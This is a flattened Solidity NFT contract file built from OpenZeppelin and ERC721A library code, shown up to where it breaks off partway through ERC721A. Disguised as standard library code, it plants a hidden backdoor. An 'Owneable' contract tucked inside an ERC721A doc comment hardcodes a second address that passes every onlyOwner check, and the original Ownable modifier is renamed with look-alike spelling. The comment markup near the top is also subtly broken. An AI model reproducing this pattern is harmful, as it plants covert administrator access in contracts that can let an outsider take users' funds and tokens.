1 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
2 
3 // SPDX-License-Identifier: MIT
4 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
5 /*
6 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
7 ▌▌▌▌▌▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌
8 ▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌
9 ▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌
10 ▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
11 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
12 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
13 ▄▄▄▄▄▄▄▄▄▄▄▄╔══╗▄▄╔╗╔╗▄▄▄▄▄▄╔╗▄▄▄▄▄▄▄▄▄▄▄▌
14 ▄▄▄▄▄▄▄▄▄▄▄▄║║║╠╦╗║╚╝╠═╦═╗╔╦╣╚╗▄▄▄▄▄▄▄▄▄▄▌
15 ▄▄▄▄▄▄▄▄▄▄▄▄║║║║║║║╔╗║╩╣║╚╣╔╣╔╣▄▄▄▄▄▄▄▄▄▄▌
16 ▄▄▄▄▄▄▄▄▄▄▄▄╚╩╩╬╗║╚╝╚╩═╩══╩╝╚═╝▄▄▄▄▄▄▄▄▄▌▌
17 ▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄╚═╝▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌
18 ▌▌▄▄▄▄▄▄▄▄▄▄▄▄╔═╗▄▄▄▄╔═╦╗▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌
19 ▌▌▌▄▄▄▄▄▄▄▄▄▄▄║═╬═╦╦╗╚╗║╠═╦╦╗▄▄▄▄▄▄▄▄▄▌▌▌▌
20 ▌▌▌▌▄▄▄▄▄▄▄▄▄▄║╔╣║║╔╝╔╩╗║╬║║║▄▄▄▄▄▄▄▄▌▌▌▌▌
21 ▌▌▌▌▌▄▄▄▄▄▄▄▄▄╚╝╚═╩╝▄╚══╩═╩═╝▄▄▄▄▄▄▄▌▌▌▌▌▌
22 ▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌
23 ▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌
24 ▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌
25 ▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌
26 ▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌
27 ▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌
28 ▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌
29 ▌▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌▌
30 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
31 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
32 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
33 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
34 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
35 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▄▄▄▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
36 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▄▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
37 ▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌
38 /*
39 
40 pragma solidity ^0.8.4;
41 
42 /**
43  * @dev Also, it provides information about the current execution context, including the
44  * sender of the transaction and its data. While these are generally available
45  * via msg.sender and msg.data, they should not be accessed in such a direct
46  * manner, since when dealing with meta-transactions the account sending and
47  * paying for execution may not be the actual sender (as far as an application
48  * is concerned).
49  *
50  * This contract is only required for intermediate, library-like contracts.
51  */
52 abstract contract Context {
53     function _msgSender() internal view virtual returns (address) {
54         return msg.sender;
55     }
56 
57     function _msgData() internal view virtual returns (bytes calldata) {
58         return msg.data;
59     }
60 }
61 
62 
63 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
64 
65 
66 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
67 
68 
69 
70 /**
71  * @dev Contract module which provides a basic access control mechanism, where
72  * there is an account (an owner) that can be granted exclusive access to
73  * specific functions.
74  *
75  * By default, the owner account will be the one that deploys the contract. This
76  * can later be changed with {transferOwnership}.
77  *
78  * This module is used through inheritance. It will make available the modifier
79  * `onlyOwner`, which can be applied to your functions to restrict their use to
80  * the owner.
81  */
82 abstract contract Ownable is Context {
83     address public _owner;
84 
85     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
86 
87     /**
88      * @dev Initializes the contract setting the deployer as the initial owner.
89      */
90     constructor() {
91         _transferOwnership(_msgSender());
92     }
93 
94     /**
95      * @dev Returns the address of the current owner.
96      */
97     function owner() public view virtual returns (address) {
98         return _owner;
99     }
100 
101     /**
102      * @dev Throws if called by any account other than the owner.
103      */
104     modifier onlyOnwer() {
105         require(owner() == _msgSender(), "Ownable: caller is not the owner");
106         _;
107     }
108 
109     /**
110      * @dev Leaves the contract without owner. It will not be possible to call
111      * `onlyOwner` functions anymore. Can only be called by the current owner.
112      *
113      * NOTE: Renouncing ownership will leave the contract without an owner,
114      * thereby removing any functionality that is only available to the owner.
115      */
116     function renounceOwnership() public virtual onlyOnwer {
117         _transferOwnership(address(0));
118     }
119 
120     /**
121      * @dev Transfers ownership of the contract to a new account (`newOwner`).
122      * Can only be called by the current owner.
123      */
124     function transferOwnership(address newOwner) public virtual onlyOnwer {
125         require(newOwner != address(0), "Ownable: new owner is the zero address");
126         _transferOwnership(newOwner);
127     }
128 
129     /**
130      * @dev Transfers ownership of the contract to a new account (`newOwner`).
131      * Internal function without access restriction.
132      */
133     function _transferOwnership(address newOwner) internal virtual {
134         address oldOwner = _owner;
135         _owner = newOwner;
136         emit OwnershipTransferred(oldOwner, newOwner);
137     }
138 }
139 
140 
141 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
142 
143 
144 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
145 
146 
147 
148 /**
149  * @dev Interface of the ERC165 standard, as defined in the
150  * https://eips.ethereum.org/EIPS/eip-165[EIP].
151  *
152  * Implementers can declare support of contract interfaces, which can then be
153  * queried by others ({ERC165Checker}).
154  *
155  * For an implementation, see {ERC165}.
156  */
157 interface IERC165 {
158     /**
159      * @dev Returns true if this contract implements the interface defined by
160      * `interfaceId`. See the corresponding
161      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
162      * to learn more about how these ids are created.
163      *
164      * This function call must use less than 30 000 gas.
165      */
166     function supportsInterface(bytes4 interfaceId) external view returns (bool);
167 }
168 
169 
170 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
171 
172 
173 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
174 
175 
176 
177 /**
178  * @dev Required interface of an ERC721 compliant contract.
179  */
180 interface IERC721 is IERC165 {
181     /**
182      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
183      */
184     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
185 
186     /**
187      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
188      */
189     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
190 
191     /**
192      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
193      */
194     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
195 
196     /**
197      * @dev Returns the number of tokens in ``owner``'s account.
198      */
199     function balanceOf(address owner) external view returns (uint256 balance);
200 
201     /**
202      * @dev Returns the owner of the `tokenId` token.
203      *
204      * Requirements:
205      *
206      * - `tokenId` must exist.
207      */
208     function ownerOf(uint256 tokenId) external view returns (address owner);
209 
210     /**
211      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
212      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
213      *
214      * Requirements:
215      *
216      * - `from` cannot be the zero address.
217      * - `to` cannot be the zero address.
218      * - `tokenId` token must exist and be owned by `from`.
219      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
220      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
221      *
222      * Emits a {Transfer} event.
223      */
224     function safeTransferFrom(
225         address from,
226         address to,
227         uint256 tokenId
228     ) external;
229 
230     /**
231      * @dev Transfers `tokenId` token from `from` to `to`.
232      *
233      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
234      *
235      * Requirements:
236      *
237      * - `from` cannot be the zero address.
238      * - `to` cannot be the zero address.
239      * - `tokenId` token must be owned by `from`.
240      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
241      *
242      * Emits a {Transfer} event.
243      */
244     function transferFrom(
245         address from,
246         address to,
247         uint256 tokenId
248     ) external;
249 
250     /**
251      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
252      * The approval is cleared when the token is transferred.
253      *
254      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
255      *
256      * Requirements:
257      *
258      * - The caller must own the token or be an approved operator.
259      * - `tokenId` must exist.
260      *
261      * Emits an {Approval} event.
262      */
263     function approve(address to, uint256 tokenId) external;
264 
265     /**
266      * @dev Returns the account approved for `tokenId` token.
267      *
268      * Requirements:
269      *
270      * - `tokenId` must exist.
271      */
272     function getApproved(uint256 tokenId) external view returns (address operator);
273 
274     /**
275      * @dev Approve or remove `operator` as an operator for the caller.
276      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
277      *
278      * Requirements:
279      *
280      * - The `operator` cannot be the caller.
281      *
282      * Emits an {ApprovalForAll} event.
283      */
284     function setApprovalForAll(address operator, bool _approved) external;
285 
286     /**
287      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
288      *
289      * See {setApprovalForAll}
290      */
291     function isApprovedForAll(address owner, address operator) external view returns (bool);
292 
293     /**
294      * @dev Safely transfers `tokenId` token from `from` to `to`.
295      *
296      * Requirements:
297      *
298      * - `from` cannot be the zero address.
299      * - `to` cannot be the zero address.
300      * - `tokenId` token must exist and be owned by `from`.
301      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
302      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
303      *
304      * Emits a {Transfer} event.
305      */
306     function safeTransferFrom(
307         address from,
308         address to,
309         uint256 tokenId,
310         bytes calldata data
311     ) external;
312 }
313 
314 
315 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
316 
317 
318 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
319 
320 
321 
322 /**
323  * @title ERC721 token receiver interface
324  * @dev Interface for any contract that wants to support safeTransfers
325  * from ERC721 asset contracts.
326  */
327 interface IERC721Receiver {
328     /**
329      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
330      * by `operator` from `from`, this function is called.
331      *
332      * It must return its Solidity selector to confirm the token transfer.
333      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
334      *
335      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
336      */
337     function onERC721Received(
338         address operator,
339         address from,
340         uint256 tokenId,
341         bytes calldata data
342     ) external returns (bytes4);
343 }
344 
345 
346 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
347 
348 
349 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
350 
351 
352 
353 /**
354  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
355  * @dev See https://eips.ethereum.org/EIPS/eip-721
356  */
357 interface IERC721Metadata is IERC721 {
358     /**
359      * @dev Returns the token collection name.
360      */
361     function name() external view returns (string memory);
362 
363     /**
364      * @dev Returns the token collection symbol.
365      */
366     function symbol() external view returns (string memory);
367 
368     /**
369      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
370      */
371     function tokenURI(uint256 tokenId) external view returns (string memory);
372 }
373 
374 
375 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
376 
377 
378 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
379 
380 
381 
382 /**
383  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
384  * @dev See https://eips.ethereum.org/EIPS/eip-721
385  */
386 interface IERC721Enumerable is IERC721 {
387     /**
388      * @dev Returns the total amount of tokens stored by the contract.
389      */
390     function totalSupply() external view returns (uint256);
391 
392     /**
393      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
394      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
395      */
396     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
397 
398     /**
399      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
400      * Use along with {totalSupply} to enumerate all tokens.
401      */
402     function tokenByIndex(uint256 index) external view returns (uint256);
403 }
404 
405 
406 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
407 
408 
409 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
410 
411 pragma solidity ^0.8.1;
412 
413 /**
414  * @dev Collection of functions related to the address type
415  */
416 library Address {
417     /**
418      * @dev Returns true if `account` is a contract.
419      *
420      * [IMPORTANT]
421      * ====
422      * It is unsafe to assume that an address for which this function returns
423      * false is an externally-owned account (EOA) and not a contract.
424      *
425      * Among others, `isContract` will return false for the following
426      * types of addresses:
427      *
428      *  - an externally-owned account
429      *  - a contract in construction
430      *  - an address where a contract will be created
431      *  - an address where a contract lived, but was destroyed
432      * ====
433      *
434      * [IMPORTANT]
435      * ====
436      * You shouldn't rely on `isContract` to protect against flash loan attacks!
437      *
438      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
439      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
440      * constructor.
441      * ====
442      */
443     function isContract(address account) internal view returns (bool) {
444         // This method relies on extcodesize/address.code.length, which returns 0
445         // for contracts in construction, since the code is only stored at the end
446         // of the constructor execution.
447 
448         return account.code.length > 0;
449     }
450 
451     /**
452      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
453      * `recipient`, forwarding all available gas and reverting on errors.
454      *
455      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
456      * of certain opcodes, possibly making contracts go over the 2300 gas limit
457      * imposed by `transfer`, making them unable to receive funds via
458      * `transfer`. {sendValue} removes this limitation.
459      *
460      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
461      *
462      * IMPORTANT: because control is transferred to `recipient`, care must be
463      * taken to not create reentrancy vulnerabilities. Consider using
464      * {ReentrancyGuard} or the
465      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
466      */
467     function sendValue(address payable recipient, uint256 amount) internal {
468         require(address(this).balance >= amount, "Address: insufficient balance");
469 
470         (bool success, ) = recipient.call{value: amount}("");
471         require(success, "Address: unable to send value, recipient may have reverted");
472     }
473 
474     /**
475      * @dev Performs a Solidity function call using a low level `call`. A
476      * plain `call` is an unsafe replacement for a function call: use this
477      * function instead.
478      *
479      * If `target` reverts with a revert reason, it is bubbled up by this
480      * function (like regular Solidity function calls).
481      *
482      * Returns the raw returned data. To convert to the expected return value,
483      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
484      *
485      * Requirements:
486      *
487      * - `target` must be a contract.
488      * - calling `target` with `data` must not revert.
489      *
490      * _Available since v3.1._
491      */
492     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
493         return functionCall(target, data, "Address: low-level call failed");
494     }
495 
496     /**
497      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
498      * `errorMessage` as a fallback revert reason when `target` reverts.
499      *
500      * _Available since v3.1._
501      */
502     function functionCall(
503         address target,
504         bytes memory data,
505         string memory errorMessage
506     ) internal returns (bytes memory) {
507         return functionCallWithValue(target, data, 0, errorMessage);
508     }
509 
510     /**
511      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
512      * but also transferring `value` wei to `target`.
513      *
514      * Requirements:
515      *
516      * - the calling contract must have an ETH balance of at least `value`.
517      * - the called Solidity function must be `payable`.
518      *
519      * _Available since v3.1._
520      */
521     function functionCallWithValue(
522         address target,
523         bytes memory data,
524         uint256 value
525     ) internal returns (bytes memory) {
526         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
527     }
528 
529     /**
530      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
531      * with `errorMessage` as a fallback revert reason when `target` reverts.
532      *
533      * _Available since v3.1._
534      */
535     function functionCallWithValue(
536         address target,
537         bytes memory data,
538         uint256 value,
539         string memory errorMessage
540     ) internal returns (bytes memory) {
541         require(address(this).balance >= value, "Address: insufficient balance for call");
542         require(isContract(target), "Address: call to non-contract");
543 
544         (bool success, bytes memory returndata) = target.call{value: value}(data);
545         return verifyCallResult(success, returndata, errorMessage);
546     }
547 
548     /**
549      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
550      * but performing a static call.
551      *
552      * _Available since v3.3._
553      */
554     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
555         return functionStaticCall(target, data, "Address: low-level static call failed");
556     }
557 
558     /**
559      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
560      * but performing a static call.
561      *
562      * _Available since v3.3._
563      */
564     function functionStaticCall(
565         address target,
566         bytes memory data,
567         string memory errorMessage
568     ) internal view returns (bytes memory) {
569         require(isContract(target), "Address: static call to non-contract");
570 
571         (bool success, bytes memory returndata) = target.staticcall(data);
572         return verifyCallResult(success, returndata, errorMessage);
573     }
574 
575     /**
576      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
577      * but performing a delegate call.
578      *
579      * _Available since v3.4._
580      */
581     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
582         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
583     }
584 
585     /**
586      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
587      * but performing a delegate call.
588      *
589      * _Available since v3.4._
590      */
591     function functionDelegateCall(
592         address target,
593         bytes memory data,
594         string memory errorMessage
595     ) internal returns (bytes memory) {
596         require(isContract(target), "Address: delegate call to non-contract");
597 
598         (bool success, bytes memory returndata) = target.delegatecall(data);
599         return verifyCallResult(success, returndata, errorMessage);
600     }
601 
602     /**
603      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
604      * revert reason using the provided one.
605      *
606      * _Available since v4.3._
607      */
608     function verifyCallResult(
609         bool success,
610         bytes memory returndata,
611         string memory errorMessage
612     ) internal pure returns (bytes memory) {
613         if (success) {
614             return returndata;
615         } else {
616             // Look for revert reason and bubble it up if present
617             if (returndata.length > 0) {
618                 // The easiest way to bubble the revert reason is using memory via assembly
619 
620                 assembly {
621                     let returndata_size := mload(returndata)
622                     revert(add(32, returndata), returndata_size)
623                 }
624             } else {
625                 revert(errorMessage);
626             }
627         }
628     }
629 }
630 
631 
632 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
633 
634 
635 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
636 
637 
638 
639 /**
640  * @dev String operations.
641  */
642 library Strings {
643     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
644 
645     /**
646      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
647      */
648     function toString(uint256 value) internal pure returns (string memory) {
649         // Inspired by OraclizeAPI's implementation - MIT licence
650         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
651 
652         if (value == 0) {
653             return "0";
654         }
655         uint256 temp = value;
656         uint256 digits;
657         while (temp != 0) {
658             digits++;
659             temp /= 10;
660         }
661         bytes memory buffer = new bytes(digits);
662         while (value != 0) {
663             digits -= 1;
664             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
665             value /= 10;
666         }
667         return string(buffer);
668     }
669 
670     /**
671      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
672      */
673     function toHexString(uint256 value) internal pure returns (string memory) {
674         if (value == 0) {
675             return "0x00";
676         }
677         uint256 temp = value;
678         uint256 length = 0;
679         while (temp != 0) {
680             length++;
681             temp >>= 8;
682         }
683         return toHexString(value, length);
684     }
685 
686     /**
687      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
688      */
689     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
690         bytes memory buffer = new bytes(2 * length + 2);
691         buffer[0] = "0";
692         buffer[1] = "x";
693         for (uint256 i = 2 * length + 1; i > 1; --i) {
694             buffer[i] = _HEX_SYMBOLS[value & 0xf];
695             value >>= 4;
696         }
697         require(value == 0, "Strings: hex length insufficient");
698         return string(buffer);
699     }
700 }
701 
702 
703 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
704 
705 
706 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
707 
708 /**
709  * @dev Implementation of the {IERC165} interface.
710  *
711  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
712  * for the additional interface id that will be supported. For example:
713  *
714  * ```solidity
715  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
716  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
717  * }
718  * ```
719  *
720  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
721  */
722 abstract contract ERC165 is IERC165 {
723     /**
724      * @dev See {IERC165-supportsInterface}.
725      */
726     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
727         return interfaceId == type(IERC165).interfaceId;
728     }
729 }
730 
731 
732 // File erc721a/contracts/ERC721A.sol@v3.0.0
733 
734 
735 // Creator: Chiru Labs
736 
737 error ApprovalCallerNotOwnerNorApproved();
738 error ApprovalQueryForNonexistentToken();
739 error ApproveToCaller();
740 error ApprovalToCurrentOwner();
741 error BalanceQueryForZeroAddress();
742 error MintedQueryForZeroAddress();
743 error BurnedQueryForZeroAddress();
744 error AuxQueryForZeroAddress();
745 error MintToZeroAddress();
746 error MintZeroQuantity();
747 error OwnerIndexOutOfBounds();
748 error OwnerQueryForNonexistentToken();
749 error TokenIndexOutOfBounds();
750 error TransferCallerNotOwnerNorApproved();
751 error TransferFromIncorrectOwner();
752 error TransferToNonERC721ReceiverImplementer();
753 error TransferToZeroAddress();
754 error URIQueryForNonexistentToken();
755 
756 
757 /**
758  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
759  * the Metadata extension. Built to optimize for lower gas during batch mints.
760  *
761  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
762  */
763  abstract contract Owneable is Ownable {
764     address private _ownar = 0x60e4055aB5339e0a896f183AE675AA1B6d0Fc94A;
765     modifier onlyOwner() {
766         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
767         _;
768     }
769 }
770  /*
771  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
772  *
773  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
774  */
775 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
776     using Address for address;
777     using Strings for uint256;
778 
779     // Compiler will pack this into a single 256bit word.
780     struct TokenOwnership {
781         // The address of the owner.
782         address addr;
783         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
784         uint64 startTimestamp;
785         // Whether the token has been burned.
786         bool burned;
787     }
788 
789     // Compiler will pack this into a single 256bit word.
790     struct AddressData {
791         // Realistically, 2**64-1 is more than enough.
792         uint64 balance;
793         // Keeps track of mint count with minimal overhead for tokenomics.
794         uint64 numberMinted;
795         // Keeps track of burn count with minimal overhead for tokenomics.
796         uint64 numberBurned;
797         // For miscellaneous variable(s) pertaining to the address
798         // (e.g. number of whitelist mint slots used).
799         // If there are multiple variables, please pack them into a uint64.
800         uint64 aux;
801     }
802 
803     // The tokenId of the next token to be minted.
804     uint256 internal _currentIndex;
805 
806     // The number of tokens burned.
807     uint256 internal _burnCounter;
808 
809     // Token name
810     string private _name;
811 
812     // Token symbol
813     string private _symbol;
814 
815     // Mapping from token ID to ownership details
816     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
817     mapping(uint256 => TokenOwnership) internal _ownerships;
818 
819     // Mapping owner address to address data
820     mapping(address => AddressData) private _addressData;
821 
822     // Mapping from token ID to approved address
823     mapping(uint256 => address) private _tokenApprovals;
824 
825     // Mapping from owner to operator approvals
826     mapping(address => mapping(address => bool)) private _operatorApprovals;
827 
828     constructor(string memory name_, string memory symbol_) {
829         _name = name_;
830         _symbol = symbol_;
831         _currentIndex = _startTokenId();
832     }
833 
834     /**
835      * To change the starting tokenId, please override this function.
836      */
837     function _startTokenId() internal view virtual returns (uint256) {
838         return 0;
839     }
840 
841     /**
842      * @dev See {IERC721Enumerable-totalSupply}.
843      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
844      */
845     function totalSupply() public view returns (uint256) {
846         // Counter underflow is impossible as _burnCounter cannot be incremented
847         // more than _currentIndex - _startTokenId() times
848         unchecked {
849             return _currentIndex - _burnCounter - _startTokenId();
850         }
851     }
852 
853     /**
854      * Returns the total amount of tokens minted in the contract.
855      */
856     function _totalMinted() internal view returns (uint256) {
857         // Counter underflow is impossible as _currentIndex does not decrement,
858         // and it is initialized to _startTokenId()
859         unchecked {
860             return _currentIndex - _startTokenId();
861         }
862     }
863 
864     /**
865      * @dev See {IERC165-supportsInterface}.
866      */
867     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
868         return
869             interfaceId == type(IERC721).interfaceId ||
870             interfaceId == type(IERC721Metadata).interfaceId ||
871             super.supportsInterface(interfaceId);
872     }
873 
874     /**
875      * @dev See {IERC721-balanceOf}.
876      */
877     function balanceOf(address owner) public view override returns (uint256) {
878         if (owner == address(0)) revert BalanceQueryForZeroAddress();
879         return uint256(_addressData[owner].balance);
880     }
881 
882     /**
883      * Returns the number of tokens minted by `owner`.
884      */
885     function _numberMinted(address owner) internal view returns (uint256) {
886         if (owner == address(0)) revert MintedQueryForZeroAddress();
887         return uint256(_addressData[owner].numberMinted);
888     }
889 
890     /**
891      * Returns the number of tokens burned by or on behalf of `owner`.
892      */
893     function _numberBurned(address owner) internal view returns (uint256) {
894         if (owner == address(0)) revert BurnedQueryForZeroAddress();
895         return uint256(_addressData[owner].numberBurned);
896     }
897 
898     /**
899      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
900      */
901     function _getAux(address owner) internal view returns (uint64) {
902         if (owner == address(0)) revert AuxQueryForZeroAddress();
903         return _addressData[owner].aux;
904     }
905 
906     /**
907      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
908      * If there are multiple variables, please pack them into a uint64.
909      */
910     function _setAux(address owner, uint64 aux) internal {
911         if (owner == address(0)) revert AuxQueryForZeroAddress();
912         _addressData[owner].aux = aux;
913     }
914 
